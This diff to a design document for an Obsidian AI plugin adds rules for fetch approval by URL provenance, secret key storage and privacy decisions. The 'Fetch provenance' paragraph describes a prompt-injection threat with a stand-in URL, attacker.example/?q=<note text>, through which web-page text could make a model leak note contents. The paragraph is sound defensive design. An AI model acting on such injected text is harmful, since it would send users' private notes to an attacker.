@@ -229,6 +229,10 @@ The registry exposes enabled tools in each backend's format: native `tools` JSON
 
 **Caps.** Searches per message default to 5, fetches per message to 5, both editable globally and per preset. Hitting a cap returns a tool error telling the model to answer with what it has; the chat shows a small "limit reached" notice.
 
+**Fetch provenance.** A model with notes in context could be steered by text on a web page into fetching `https://attacker.example/?q=<note text>`. So `fetch_page` runs without asking only for URLs that appeared verbatim in this chat's search results, in the user's own messages, or in attached notes; any other URL shows an approval card with the full URL first, and nothing is requested until the user approves.
+
+**Keys.** Search API keys live in Obsidian's SecretStorage; Lektor's settings store only the secret's name. No search provider is selected by default, so no search traffic happens until the user picks one.
+
 **Network.** All tool HTTP goes through Obsidian's `requestUrl` (no CORS issues, one place to log). No other outbound calls exist.
 
 ## Edits and diff review
@@ -410,6 +414,8 @@ Build in this order; each milestone ends usable and with its tests passing. Don'
 - *(2026-11-26)* The current-note chip follows the active note; pinning keeps a note, and removing the chip stops the following for that chat.
 - *(2026-11-26)* Obsidian's "Excluded files" are respected, behind a setting that is on by default.
 - *(2026-11-26)* Reopening a chat restores its chips from the stored manifest and reads them fresh. Deleted or newly excluded notes are dropped with a notice, and notes changed since they were last sent are marked. Selections are stored as a note path, character range and hash, never as text, and are dropped if the text has changed.
+- *(2026-11-26, before milestone 4)* `fetch_page` approval follows URL provenance (see Tools framework): known URLs run freely, others need an approval card.
+- *(2026-11-26)* Replies and the model's thinking are chat text and are kept in history, where they may quote notes; the privacy settings say so, and when a note is deleted Lektor offers to delete the chats that sent it (found through their context manifests).
 - *(2026-11-26)* UI checks run against a separate Obsidian instance (its own profile folder) on a copy of the fixtures vault, driven with Playwright.
 
 - Link depth follows outgoing links. Backlinks are sent as a list (no content) by default; a toggle adds their contents.
